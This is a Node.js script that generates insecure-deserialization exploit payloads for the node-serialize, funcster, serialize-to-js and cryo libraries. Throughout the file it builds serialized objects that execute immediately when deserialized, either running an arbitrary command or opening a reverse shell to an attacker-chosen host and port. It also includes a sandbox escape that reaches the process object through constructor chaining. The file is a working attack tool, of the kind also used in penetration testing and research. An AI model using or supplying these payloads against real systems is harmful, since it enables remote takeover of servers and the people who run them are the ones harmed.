var fs = require('fs');

var argv = require('yargs')
    .usage('Usage: $0 -f [file] [options]')
    .alias('f','file')
    .alias('m','mode')
    .alias('s','serializer')
    .alias('v','vector')
    .alias('c','command')
    .alias('e','encode')
    .alias('H','lhost')
    .alias('P','lport')
    .alias('t','target')
    .choices('s',['s2j','ns', 'fstr', 'cryo'])
    .choices('m',['serialize','deserialize'])
    .choices('v',['rce','rshell'])
    .choices('t',['linux','windows'])
    .default('t', 'windows')
    .default('s', 'ns')
    .default('m', 'serialize')
	.describe('f','Input file')
    .describe('m','Operational mode, may be serialize or deserialize')
    .describe('s','The serializer module to use')
    .describe('v','The vector is command exe or reverse shell')
    .describe('c','The command to execute (-v rce must be used)')
    .describe('e','Charencode the payload (not implemented yet)')
    .describe('H','Local listener IP (-v rshell must be used)')
    .describe('P','Local listener PORT (-v rshell must be used)')
    .describe('t','Target machine OS, may be Win or Linux')
    .demandOption(['f'])
	.showHelpOnFail(false, "Specify --help for available options")
    .argv;

var payload;

function serialize(serializer, object){
    if(serializer == "s2j"){
        var serialize = require('serialize-to-js');
        var obj = serialize(object);
        return JSON.stringify(obj,null,0);
    }else if(serializer == "fstr"){
        var serialize = require('funcster');
        return JSON.stringify(serialize.deepSerialize(object));
    }else if(serializer == "ns"){
        return require('node-serialize').serialize(object);
    }else if(argv.serializer == "cryo"){
        return require('cryo').stringify(object);
    }
}

function deserialize(serializer, object){
    if(serializer == "s2j"){
        return require('node-serialize').unserialize(object);
    }else if(serializer == "fstr"){
        return require('funcster').deepDeserialize(object);    
    }else if(serializer == "ns"){
        return require('node-serialize').unserialize(object);
    }else if(argv.serializer == "cryo"){
        return require('cryo').parse(object);
    }
}

cmd_tag = /####COMMAND####/g;
lhost_tag = /####LHOST####/g;
lport_tag = /####LPORT####/g;
shell_tag = /####SHELL####/g;
sentinel_tag = /\/\/####SENTINEL####}/g;

if(argv.vector == "rshell" && argv.serializer != "cryo"){
    if(typeof argv.lport == 'undefined' || typeof argv.lhost == 'undefined'){
        console.log("[-] RShell vector requires LHOST and LPORT to be specified");
        process.exit();
    }
    payload = {
        rce : function() {
            var net = require('net');
            var spawn = require('child_process').spawn;
            HOST = "####LHOST####";
            PORT = "####LPORT####";
            TIMEOUT="5000";
            if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
            function c(HOST,PORT) {
                var client = new net.Socket();
                client.connect(PORT, HOST, function() {
                    var sh = spawn("####SHELL####",[]);
                    client.write("Connected!");
                    client.pipe(sh.stdin);
                    sh.stdout.pipe(client);
                    sh.stderr.pipe(client);
                    sh.on('exit',function(code,signal){
                      client.end("Disconnected!");
                    });
                });
                client.on('error', function(e) {
                    setTimeout(c(HOST,PORT), TIMEOUT);
                });
            }
            c(HOST,PORT);//####SENTINEL####
        }
    }
} else if(argv.vector == "rshell" && argv.serializer == "cryo"){
    if(typeof argv.lport == 'undefined' || typeof argv.lhost == 'undefined'){
        console.log("[-] RShell vector requires LHOST and LPORT to be specified");
        process.exit();
    }
    payload = 
    {
        __proto : 
        { 
            toString: function() {
                var net = require('net');
                var spawn = require('child_process').spawn;
                HOST = "####LHOST####";
                PORT = "####LPORT####";
                TIMEOUT="5000";
                if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
                function c(HOST,PORT) {
                    var client = new net.Socket();
                    client.connect(PORT, HOST, function() {
                        var sh = spawn('####SHELL####',[]);
                        client.write("Connected!");
                        client.pipe(sh.stdin);
                        sh.stdout.pipe(client);
                        sh.stderr.pipe(client);
                        sh.on('exit',function(code,signal){
                          client.end("Disconnected!");
                        });
                    });
                    client.on('error', function(e) {
                        setTimeout(c(HOST,PORT), TIMEOUT);
                    });
                }
                c(HOST,PORT);//####SENTINEL####
            },
            valueOf : function() {
                var net = require('net');
                var spawn = require('child_process').spawn;
                HOST = "####LHOST####";
                PORT = "####LPORT####";
                TIMEOUT="5000";
                if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
                function c(HOST,PORT) {
                    var client = new net.Socket();
                    client.connect(PORT, HOST, function() {
                        var sh = spawn('cmd',[]);
                        client.write("Connected!");
                        client.pipe(sh.stdin);
                        sh.stdout.pipe(client);
                        sh.stderr.pipe(client);
                        sh.on('exit',function(code,signal){
                          client.end("Disconnected!");
                        });
                    });
                    client.on('error', function(e) {
                        setTimeout(c(HOST,PORT), TIMEOUT);
                    });
                }
                c(HOST,PORT);//####SENTINEL####
            }
        } 
    }
} else if (argv.vector == "rce" && argv.serializer != "cryo"){
    if(typeof argv.command == 'undefined'){
        console.log("[-] RCE vector requires a command to be specified");
        process.exit();
    }
    payload = {
        rce : function(){
            CMD = "####COMMAND####";
            require('child_process').exec(CMD, function(error, stdout, stderr) { console.log(stdout) });//####SENTINEL####
        },
    }
}else if (argv.vector == "rce" && argv.serializer == "cryo"){
    if(typeof argv.command == 'undefined'){
        console.log("[-] RCE vector requires a command to be specified");
        process.exit();
    }
    payload = {
        __proto : {
            toString: function(){
                CMD = "####COMMAND####";
                require('child_process').exec(CMD, function(error, stdout, stderr) { console.log(stdout) });//####SENTINEL####
            },
        }
    }
} else {
    payload = {
        rce : function(){
            require('child_process').exec('cmd /c calc', function(error, stdout, stderr) { console.log(stdout) });//####SENTINEL####
        },
    }
}


if(argv.mode == "serialize"){
    var serialized_object = serialize(argv.serializer, payload);
    if(argv.serializer == "cryo"){
        serialized_object = serialized_object.replace("__proto","__proto__");
    }
    serialized_object = serialized_object.replace(/(\\t|\\n)/gmi,"");
    serialized_object = serialized_object.replace(/(\s+)/gmi," ");
    serialized_object = serialized_object.replace(cmd_tag, argv.command);
    serialized_object = serialized_object.replace(lhost_tag, argv.lhost);
    serialized_object = serialized_object.replace(lport_tag, argv.lport);
    if (argv.target == "windows"){
        serialized_object = serialized_object.replace(shell_tag, "cmd");
    }else if(argv.target == "linux"){
        serialized_object = serialized_object.replace(shell_tag, "/bin/sh");
    }
    serialized_object = serialized_object.replace(sentinel_tag, '}()');
    if(argv.serializer == "fstr" || argv.serializer == "cryo"){
        if (argv.vector == "rce"){
            serialized_object = serialized_object.replace("require('child_process')", "const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process')");
            }
        else if(argv.vector == "rshell"){
            serialized_object = serialized_object.replace("var net=require('net');var spawn=require('child_process').spawn;", "const process = this.constructor.constructor('return this.process')();var spawn=process.mainModule.require('child_process').spawn;var net=process.mainModule.require('net');");                
            serialized_object = serialized_object.replace("var net = require('net');var spawn = require('child_process').spawn;", "const process = this.constructor.constructor('return this.process')();var spawn=process.mainModule.require('child_process').spawn;var net=process.mainModule.require('net');");                
        }
    }    
    console.log(serialized_object);
    
    fs.writeFile(argv.file, serialized_object, function (err) {
        if (err) throw err;
        console.log('[+] Serializing payload');
}); 
}else if(argv.mode == "deserialize"){
    fs.readFile(argv.file, function(err, data) {
        if (err) throw err;
        console.log('[+] Deserializing payload');
        var object = data;
        if(argv.serializer != "cryo"){
            object = JSON.parse(data);
        }
        console.log(object);
        var deser = deserialize(argv.serializer, object);
        console.log(deser.toString());
        
    });
}